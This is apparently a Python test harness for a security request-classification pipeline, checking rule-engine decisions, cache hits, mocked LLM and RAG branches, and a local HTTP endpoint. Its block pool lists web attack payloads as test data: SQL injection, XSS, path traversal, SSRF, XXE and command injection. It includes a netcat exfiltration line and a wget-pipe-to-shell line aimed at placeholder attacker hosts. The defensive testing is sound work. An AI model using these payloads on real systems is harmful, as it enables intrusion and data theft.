import sys
import time
from collections import Counter
from contextlib import contextmanager
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import requests

from graph_app import soc_app
from backends.rule_engine import analyze_request
from backends.cache_backend import _CACHE, _save_cache
import nodes.nodes_llm as n_llm
import nodes.nodes_rag as n_rag


def build_fast_allow_pool() -> list[str]:
    return [
        "GET /health HTTP/1.1",
        "GET /ready HTTP/1.1",
        "GET /livez HTTP/1.1",
        "GET /metrics HTTP/1.1",
        "GET /favicon.ico HTTP/1.1",
        "GET /assets/main.css HTTP/1.1",
        "GET /assets/app.js HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "GET /docs/index.html HTTP/1.1",
        "GET /api/v1/users?page=1&limit=20 HTTP/1.1",
        "GET /api/v1/orders/123 HTTP/1.1",
        "GET /api/v2/products?category=laptop HTTP/1.1",
        "HEAD /api/v1/users HTTP/1.1",
        "OPTIONS /api/v1/login HTTP/1.1",
        "GET /status HTTP/1.1",
        "GET /healthz HTTP/1.1",
        "GET /api/v1/search?q=mouse HTTP/1.1",
        "GET /api/v1/invoices/7788 HTTP/1.1",
        "GET /api/v1/notifications?unread=true HTTP/1.1",
        "GET /api/v1/profile/42 HTTP/1.1",
        "GET /api/v1/reports/daily HTTP/1.1",
        "GET /api/v1/categories?page=2 HTTP/1.1",
        "GET /api/v1/settings HTTP/1.1",
        "GET /api/v1/messages?limit=10 HTTP/1.1",
        "GET /api/v1/cart/items HTTP/1.1",
    ]


def build_fast_block_pool() -> list[str]:
    return [
        "GET /users?id=1 UNION SELECT password FROM users HTTP/1.1",
        "POST /login HTTP/1.1\n\nusername=admin' OR '1'='1&password=x",
        "GET /search?q=<script>alert(1)</script> HTTP/1.1",
        "GET /file?path=../../../../etc/passwd HTTP/1.1",
        "POST /exec HTTP/1.1\n\ncmd=cat /etc/passwd | nc attacker.com 4444",
        "GET /?url=http://169.254.169.254/latest/meta-data HTTP/1.1",
        "GET /?redirect=https://evil.example.com HTTP/1.1",
        "GET /?q=javascript:alert(document.cookie) HTTP/1.1",
        "GET /?x=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1",
        "GET /download?f=..\\..\\..\\Windows\\system.ini HTTP/1.1",
        "GET /admin?u=1;wget http://evil/a.sh|sh HTTP/1.1",
        "POST /search HTTP/1.1\n\nq='; DROP TABLE users; --",
        "GET /?next=//evil.com HTTP/1.1",
        "GET /?a=${7*7} HTTP/1.1",
        "GET /?dest=http://127.0.0.1:8080/internal HTTP/1.1",
        "GET /?payload=<svg onload=alert(1)> HTTP/1.1",
        "GET /api?path=%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1",
        "GET /?x=file:///etc/passwd HTTP/1.1",
        "POST /xml HTTP/1.1\n\n<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
        "GET /?q=UNION ALL SELECT @@version HTTP/1.1",
        "GET /?cmd=|bash -c id HTTP/1.1",
        "GET /?q=<iframe src=javascript:alert(1)> HTTP/1.1",
        "GET /?f=../../../proc/self/environ HTTP/1.1",
        "POST /run HTTP/1.1\n\ncommand=;bash -c id",
        "GET /?url=gopher://127.0.0.1:11211/_stats HTTP/1.1",
    ]


def build_slow_candidates() -> list[str]:
    return [
        "q=",
        "name=abc",
        "search=select",
        "/api/users?page=1",
        "abc123",
        "OR 1=1",
        "foo bar",
        "hello security team",
        "request id: 9921",
        "note=please review this unusual string",
    ]


def repeat_to_count(items: list[str], target: int) -> list[str]:
    out = []
    idx = 0
    while len(out) < target:
        out.append(items[idx % len(items)])
        idx += 1
    return out


def summarize(result: dict) -> dict:
    items = result.get("items", [])
    outputs = result.get("result_json", {}).get("results", [])
    return {
        "blocked": sum(1 for i in items if i.get("blocked")),
        "cache_hit": sum(1 for i in items if i.get("cache_hit")),
        "decision_counts": dict(Counter(i.get("fast_decision") for i in items)),
        "route_counts": dict(Counter(o.get("route") for o in outputs)),
        "source_counts": dict(Counter(o.get("source") for o in outputs)),
        "event_counts": dict(Counter(o.get("event_type") for o in outputs)),
    }


def clear_cache():
    _CACHE.clear()
    _save_cache()


def run_graph(requests_batch: list[str]) -> tuple[dict, float]:
    t0 = time.time()
    result = soc_app.invoke({"requests": requests_batch})
    return result, (time.time() - t0)


def validate_fast_run(reqs: list[str], run1: dict, run2: dict) -> list[str]:
    errors = []
    items1 = run1.get("items", [])
    items2 = run2.get("items", [])

    for idx, req in enumerate(reqs):
        dec = analyze_request(req).get("fast_decision")
        it1 = items1[idx]
        it2 = items2[idx]

        if dec not in ("ALLOW", "BLOCK"):
            errors.append(f"[{idx}] expected fast decision for real-fast suite, got {dec}")

        if dec == "BLOCK" and not it1.get("blocked"):
            errors.append(f"[{idx}] expected blocked=True on run1 for BLOCK")
        if dec == "ALLOW" and it1.get("blocked"):
            errors.append(f"[{idx}] expected blocked=False on run1 for ALLOW")
        if it1.get("cache_hit"):
            errors.append(f"[{idx}] run1 should not be cache hit")
        if not it2.get("cache_hit"):
            errors.append(f"[{idx}] run2 should be cache hit")

    return errors


@contextmanager
def mocked_slow_dependencies():
    old_vec = n_rag.vector_search
    old_single = n_llm.llm_analyze
    old_bulk = n_llm.llm_bulk_analyze

    def fake_vec(query: str, k: int = 3):
        return [{"raw_request": query[:80], "label": "normal", "attack_type": "context"}]

    def mk_analysis(text: str) -> dict:
        lower = text.lower()
        suspicious = any(x in lower for x in ["or 1=1", "union", "script", "passwd", "cmd"]) 
        if suspicious:
            return {
                "threat_score": 7,
                "attack_type": "Unknown",
                "justification": "Mocked LLM marks payload as suspicious.",
                "action": "BLOCK",
                "recommendation": "Investigate request context and origin."
            }
        return {
            "threat_score": 2,
            "attack_type": "Benign",
            "justification": "Mocked LLM sees low risk pattern.",
            "action": "ALLOW",
            "recommendation": "Keep monitoring."
        }

    def fake_single(query: str, rag_context: str):
        return {"analysis": mk_analysis(query), "model": "mock-llm", "raw_text": "mock"}

    def fake_bulk(queries: list[str], rag_contexts: list[str]):
        return [{"analysis": mk_analysis(q), "model": "mock-llm", "raw_text": "mock"} for q in queries]

    n_rag.vector_search = fake_vec
    n_llm.llm_analyze = fake_single
    n_llm.llm_bulk_analyze = fake_bulk

    try:
        yield
    finally:
        n_rag.vector_search = old_vec
        n_llm.llm_analyze = old_single
        n_llm.llm_bulk_analyze = old_bulk


def validate_mixed_mock(reqs: list[str], run1: dict, run2: dict) -> list[str]:
    errors = []
    items1 = run1.get("items", [])
    out1 = run1.get("result_json", {}).get("results", [])
    items2 = run2.get("items", [])

    for idx, req in enumerate(reqs):
        exp_dec = analyze_request(req).get("fast_decision")
        it1 = items1[idx]
        o1 = out1[idx]
        it2 = items2[idx]

        if not it1.get("cache_hit"):
            pass
        else:
            errors.append(f"[{idx}] run1 should not be cache hit")

        if exp_dec in ("REVIEW", "MONITOR"):
            llm_out = it1.get("llm_output") or {}
            if not llm_out.get("model"):
                errors.append(f"[{idx}] slow path should have llm model")
            if o1.get("source") != "llm_explainer":
                errors.append(f"[{idx}] slow path source expected llm_explainer, got {o1.get('source')}")
        else:
            if o1.get("source") != "rule_engine":
                errors.append(f"[{idx}] fast path source expected rule_engine, got {o1.get('source')}")

        if not it2.get("cache_hit"):
            errors.append(f"[{idx}] run2 expected cache_hit=True")

    return errors


def check_http_endpoint() -> dict:
    mini = [
        "GET /health HTTP/1.1",
        "GET /assets/main.css HTTP/1.1",
        "GET /users?id=1 UNION SELECT password FROM users HTTP/1.1",
    ]
    try:
        t0 = time.time()
        r = requests.post("http://localhost:8000/analyze", json={"requests": mini}, timeout=90)
        dt = time.time() - t0
        body_preview = r.text[:500]
        return {"status": r.status_code, "elapsed": round(dt, 3), "body_preview": body_preview}
    except Exception as e:
        return {"status": None, "elapsed": None, "body_preview": str(e)}


def main():
    print("=" * 110)
    print("THOROUGH FLOW VALIDATION")
    print("=" * 110)

    # 1) Real fast-only suite (no LLM dependency)
    fast_allow = build_fast_allow_pool()
    fast_block = build_fast_block_pool()
    real_fast_batch = repeat_to_count(fast_allow, 25) + repeat_to_count(fast_block, 25)

    clear_cache()
    run1, t1 = run_graph(real_fast_batch)
    run2, t2 = run_graph(real_fast_batch)
    errs_fast = validate_fast_run(real_fast_batch, run1, run2)

    print("\n[Suite A] Real dependencies, 50 requests, fast branches only")
    print(f"Run1 elapsed: {t1:.3f}s | Run2 elapsed (cache): {t2:.3f}s")
    print("Run1 summary:", summarize(run1))
    print("Run2 summary:", summarize(run2))
    print("Validation errors:", len(errs_fast))
    for e in errs_fast[:20]:
        print("  -", e)

    # 2) Mixed suite with mocked slow dependencies (to verify branch logic thoroughly)
    mixed_batch = repeat_to_count(fast_allow, 20) + repeat_to_count(fast_block, 20) + repeat_to_count(build_slow_candidates(), 10)

    with mocked_slow_dependencies():
        clear_cache()
        m1, mt1 = run_graph(mixed_batch)
        m2, mt2 = run_graph(mixed_batch)
    errs_mixed = validate_mixed_mock(mixed_batch, m1, m2)

    print("\n[Suite B] Mocked LLM/RAG, 50 requests mixed fast+slow")
    print(f"Run1 elapsed: {mt1:.3f}s | Run2 elapsed (cache): {mt2:.3f}s")
    print("Run1 summary:", summarize(m1))
    print("Run2 summary:", summarize(m2))
    print("Validation errors:", len(errs_mixed))
    for e in errs_mixed[:20]:
        print("  -", e)

    # 3) HTTP endpoint sanity check (running instance)
    http_res = check_http_endpoint()
    print("\n[Suite C] HTTP endpoint sanity")
    print(http_res)

    overall = (len(errs_fast) == 0 and len(errs_mixed) == 0)
    print("\nOverall (A+B):", "PASS" if overall else "FAIL")


if __name__ == "__main__":
    main()
